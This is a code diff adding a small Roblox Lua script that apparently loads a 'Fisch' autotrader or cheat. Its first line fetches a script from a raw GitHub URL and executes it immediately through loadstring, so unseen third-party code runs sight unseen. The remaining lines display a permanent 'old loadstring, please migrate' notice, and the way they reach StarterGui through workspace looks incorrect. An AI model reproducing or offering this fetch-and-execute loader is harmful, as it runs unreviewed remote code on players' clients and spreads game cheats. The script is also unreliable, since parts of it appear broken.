@@ -1,0 +1,10 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EpicGamer-Stack/FischAutotrader/refs/heads/main/whalefien"))()
+
+local Starter = workspace.StarterGui
+
+local SetCore = Starter:SetCore("SendNotification",{
+		Title = "Notice",
+		Text = "You are using an old loadstring. Please Migrate!",
+		Icon = "",
+		Duration = math.huge
+	})
